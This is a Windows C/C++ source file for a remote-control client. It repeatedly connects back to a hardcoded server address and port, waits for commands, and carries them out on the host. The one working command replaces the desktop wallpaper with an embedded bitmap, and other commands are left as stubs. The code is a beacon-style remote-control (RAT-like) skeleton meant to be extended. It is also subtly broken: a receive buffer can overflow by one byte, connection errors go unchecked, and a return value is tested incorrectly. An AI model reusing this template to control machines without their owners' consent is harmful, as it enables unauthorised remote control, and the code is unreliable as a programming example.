#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlguid.h>
#include <shlobj.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shell32.lib")

#define MAX_COMMAND_LENGTH	256
#define RECONNECT_DELAY		5000 // milliseconds
#define WALLPAPER_RESOURCE_ID	101

HBITMAP LoadBitmapFromResource(int resourceID) {
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_BITMAP);
	if(!hRes) return NULL;
	
	HGLOBAL hGlobal = LoadResource(NULL, hRes);
	if(!hGlobal) return NULL;
	
	LPVOID pData = LockResource(hGlobal);
	if(!pData) return NULL;
	
	BITMAPINFO* pBitmapInfo = (BITMAPINFO*)pData;
	return CreateDIBitmap(GetDC(NULL), &pBitmapInfo->bmiHeader, CBM_INIT, 
							(LPVOID)((BYTE*)pData + pBitmapInfo->bmiHeader.biSize),
							pBitmapInfo, DIB_RGB_COLORS);
}

void saveBitmapToFile(HBITMAP hBitmap, const char* filePath) {
	BITMAP bitmap;
	GetObject(hBitmap, sizeof(BITMAP), &bitmap);
	
	BITMAPFILEHEADER bfh = {0};
	bfh.bfType = 0x4D42; // BM
	bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bfh.bfSize = bfh.bfOffBits + bitmap.bmWidth * bitmap.bmHeight * (bitmap.bmBitsPixel / 8);
	
	BITMAPINFOHEADER bih = {0};
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biWidth = bitmap.bmWidth;
	bih.biHeight = bitmap.bmHeight;
	bih.biPlanes = 1;
	bih.biBitCount = bitmap.bmBitsPixel;
	bih.biCompression = BI_RGB;
	bih.biSizeImage = 0;
	bih.biXPelsPerMeter = 0;
	bih.biYPelsPerMeter = 0;
	bih.biClrUsed = 0;
	bih.biClrImportant = 0;
	
	FILE* file = fopen(filePath, "wb");
	if(file) {
		fwrite(&bfh, sizeof(bfh), 1, file);
		fwrite(&bih, sizeof(bih), 1, file);
		
		unsigned char* buffer = new unsigned char[bitmap.bmWidth * bitmap.bmHeight * (bitmap.bmBitsPixel / 8)];
		GetDIBits(GetDC(NULL), hBitmap, 0, bitmap.bmHeight, buffer, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
		fwrite(buffer, bitmap.bmWidth * bitmap.bmHeight * (bitmap.bmBitsPixel / 8), 1, file);
		
		delete[] buffer;
		fclose(file);
	}
}

void helpCommand(SOCKET clientSocket) {
	char helpText[] = "Available commands:\n"
					  "help - Display this help message\n"
					  "command1 - Description of command 1\n"
					  "setwallpaper - Set the default wallpaper\n"
					  "command3 - Description of command 3\n";
	
	send(clientSocket, helpText, strlen(helpText), 0);
}

void setWallpaperCommand(SOCKET clientSocket) {
	HBITMAP hBitmap = LoadBitmapFromResource(WALLPAPER_RESOURCE_ID);
	if(hBitmap) {
		char tempPath[MAX_PATH];
		GetTempPath(MAX_PATH, tempPath);
		strcat(tempPath, "wallpaper.bmp");
		
		saveBitmapToFile(hBitmap, tempPath);
		
		HRESULT hr = SystemParametersInfo(
			SPI_SETDESKWALLPAPER,
			0,
			(LPVOID)tempPath,
			SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
		);
		
		if(SUCCEEDED(hr)) {
			char successMsg[] = "Wallpaper changed successfully\n";
			send(clientSocket, successMsg, strlen(successMsg), 0);
		} else {
			char errorMsg[] = "Failed to change wallpaper\n";
			send(clientSocket, errorMsg, strlen(errorMsg), 0);
		}
		
		DeleteFile(tempPath);
		DeleteObject(hBitmap);
	} else {
		char errorMsg[] = "Failed to load wallpaper image\n";
		send(clientSocket, errorMsg, strlen(errorMsg), 0);
	}
}

void handleCommand(char* command, SOCKET clientSocket) {
	if(strcmp(command, "help") == 0) {
		helpCommand(clientSocket);
	}
	else if(strcmp(command, "command1") == 0) {
		// Implement command 1 logic here
	}
	else if(strcmp(command, "setwallpaper") == 0) {
		setWallpaperCommand(clientSocket);
	}
	else if(strcmp(command, "command3") == 0) {
		// Implement command 3 logic here
	}
	else {
		char unknownCommand[] = "Unknown command. Type 'help' for available commands.\n";
		send(clientSocket, unknownCommand, strlen(unknownCommand), 0);
	}
}

SOCKET connectToServer() {
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;

	WSAStartup(MAKEWORD(2,2), &wsaData);

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	getaddrinfo("192.168.197.222", "27015", &hints, &result);

	for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	}

	freeaddrinfo(result);
	return ConnectSocket;
}

int main() {
	SOCKET ConnectSocket;
	char recvbuf[MAX_COMMAND_LENGTH];
	int iResult;
	int recvbuflen = MAX_COMMAND_LENGTH;

	while(1) {
		ConnectSocket = connectToServer();
		
		if(ConnectSocket == INVALID_SOCKET) {
			printf("Failed to connect, retrying in %d seconds...\n", RECONNECT_DELAY/1000);
			Sleep(RECONNECT_DELAY);
			continue;
		}

		printf("Connected to server\n");

		while(1) {
			iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
			
			if(iResult > 0) {
				recvbuf[iResult] = '\0';
				handleCommand(recvbuf, ConnectSocket);
			}
			else {
				printf("Connection closed or error occurred, reconnecting...\n");
				closesocket(ConnectSocket);
				Sleep(RECONNECT_DELAY);
				break;
			}
		}
	}

	WSACleanup();
	return 0;
}